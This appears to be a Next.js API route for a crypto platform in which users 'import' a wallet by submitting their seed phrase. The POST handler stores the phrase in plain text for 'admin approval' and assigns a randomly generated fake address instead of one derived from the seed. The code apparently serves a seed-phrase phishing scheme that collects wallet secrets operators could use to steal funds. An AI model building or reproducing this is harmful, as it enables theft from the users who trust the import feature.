import { NextRequest, NextResponse } from 'next/server';
import { auth } from '@/lib/auth';
import { connectToDatabase } from '@/db/connection';
import { Wallet, User, UserHolding } from '@/db/models';
import mongoose from 'mongoose';

// Helper to generate a random wallet address
function generateWalletAddress(): string {
  const chars = '0123456789abcdef';
  let address = '0x';
  for (let i = 0; i < 40; i++) {
    address += chars[Math.floor(Math.random() * chars.length)];
  }
  return address;
}

// Default tokens for new wallets
const DEFAULT_TOKENS = [
  { symbol: 'BTC', name: 'Bitcoin', icon: 'https://assets.coingecko.com/coins/images/1/small/bitcoin.png' },
  { symbol: 'ETH', name: 'Ethereum', icon: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png' },
  { symbol: 'USDT', name: 'Tether', icon: 'https://assets.coingecko.com/coins/images/325/small/Tether.png' },
  { symbol: 'USDC', name: 'USD Coin', icon: 'https://assets.coingecko.com/coins/images/6319/small/usdc.png' },
  { symbol: 'BNB', name: 'BNB', icon: 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png' },
  { symbol: 'SOL', name: 'Solana', icon: 'https://assets.coingecko.com/coins/images/4128/small/solana.png' },
  { symbol: 'XRP', name: 'XRP', icon: 'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png' },
  { symbol: 'DOGE', name: 'Dogecoin', icon: 'https://assets.coingecko.com/coins/images/5/small/dogecoin.png' },
  { symbol: 'ADA', name: 'Cardano', icon: 'https://assets.coingecko.com/coins/images/975/small/cardano.png' },
  { symbol: 'AVAX', name: 'Avalanche', icon: 'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png' },
];

// GET - Fetch user's wallets with current holdings
export async function GET() {
  try {
    const session = await auth();
    if (!session?.user?.id) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    await connectToDatabase();

    const userId = new mongoose.Types.ObjectId(session.user.id);

    // Get all wallets for user
    const wallets = await Wallet.find({ userId }).sort({ createdAt: -1 }).lean();
    
    // Get user's current holdings
    const holdings = await UserHolding.find({ userId }).lean();
    const holdingsMap: Record<string, number> = {};
    holdings.forEach(h => {
      holdingsMap[h.symbol] = h.amountUsd || 0;
    });

    // Enhance wallets with current balances
    const enhancedWallets = wallets.map(w => ({
      ...w,
      tokens: w.tokens.map(t => ({
        ...t,
        initialAmountUsd: t.amountUsd, // What was funded at approval time
        currentAmountUsd: holdingsMap[t.symbol] || 0, // Current amount in system
      })),
    }));

    // Calculate totals
    const approvedWallets = wallets.filter(w => w.status === 'approved');
    const pendingWallets = wallets.filter(w => w.status === 'pending');
    const totalWalletBalance = approvedWallets.reduce((sum, w) => sum + (w.totalBalanceUsd || 0), 0);

    return NextResponse.json({
      wallets: enhancedWallets,
      stats: {
        total: wallets.length,
        approved: approvedWallets.length,
        pending: pendingWallets.length,
        totalBalanceUsd: totalWalletBalance, // Initial balance (snapshot)
      },
    });
  } catch (error) {
    console.error('Error fetching wallets:', error);
    return NextResponse.json({ error: 'Failed to fetch wallets' }, { status: 500 });
  }
}

// POST - Import a new wallet
export async function POST(request: NextRequest) {
  try {
    const session = await auth();
    if (!session?.user?.id) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    await connectToDatabase();

    const { walletType, walletName, walletIcon, seedPhrase } = await request.json();

    if (!walletType || !walletName || !seedPhrase) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    // Validate seed phrase (basic validation - should be 12 or 24 words)
    const words = seedPhrase.trim().split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
      return NextResponse.json({ 
        error: 'Invalid seed phrase. Must be 12 or 24 words.' 
      }, { status: 400 });
    }

    const userId = new mongoose.Types.ObjectId(session.user.id);

    // Check if user already has this wallet type pending or approved
    const existingWallet = await Wallet.findOne({ 
      userId, 
      walletType,
      status: { $in: ['pending', 'approved'] }
    });

    if (existingWallet) {
      return NextResponse.json({ 
        error: `You already have a ${walletName} wallet ${existingWallet.status === 'pending' ? 'pending approval' : 'connected'}` 
      }, { status: 400 });
    }

    // Generate wallet address
    const address = generateWalletAddress();

    // Create wallet with default tokens (all at 0 balance)
    const tokens = DEFAULT_TOKENS.map(t => ({
      ...t,
      amount: 0,
      amountUsd: 0,
    }));

    const wallet = await Wallet.create({
      userId,
      walletType,
      walletName,
      walletIcon: walletIcon || '',
      seedPhrase: seedPhrase.trim(),
      address,
      status: 'pending',
      tokens,
      totalBalanceUsd: 0,
    });

    // Add notification to user
    await User.findByIdAndUpdate(userId, {
      $push: {
        notifications: {
          $each: [{
            type: 'wallet',
            title: 'Wallet Import Pending',
            message: `Your ${walletName} wallet is being verified. You'll be notified once approved.`,
            read: false,
            createdAt: new Date(),
          }],
          $position: 0,
        },
      },
    });

    console.log(`✅ User ${session.user.email} imported ${walletName} wallet, pending approval`);

    return NextResponse.json({
      message: 'Wallet imported successfully. Pending admin approval.',
      wallet: {
        id: wallet._id,
        walletType: wallet.walletType,
        walletName: wallet.walletName,
        address: wallet.address,
        status: wallet.status,
      },
    });
  } catch (error) {
    console.error('Error importing wallet:', error);
    return NextResponse.json({ error: 'Failed to import wallet' }, { status: 500 });
  }
}
